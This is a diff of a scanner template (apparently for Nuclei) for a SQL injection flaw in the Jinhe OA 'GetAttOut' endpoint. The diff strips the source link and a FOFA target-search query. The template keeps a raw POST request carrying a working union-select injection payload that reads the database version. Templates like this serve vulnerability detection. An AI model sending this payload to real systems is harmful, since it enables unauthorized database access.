@@ -3,12 +3,8 @@ info:
   name: 金和OA GetAttOut接口SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/trlr263mpkxes5nr'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: trlr263mpkxes5nr
-    fofa: app="金和网络-金和OA" || body="/jc6/platform/sys/login"
 http:
 - raw:
   - 'POST /jc6/JHSoft.WCF/TEST/GetAttOut HTTP/1.1
@@ -27,8 +23,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     1'' union select null,null,@@version,null,null,null--
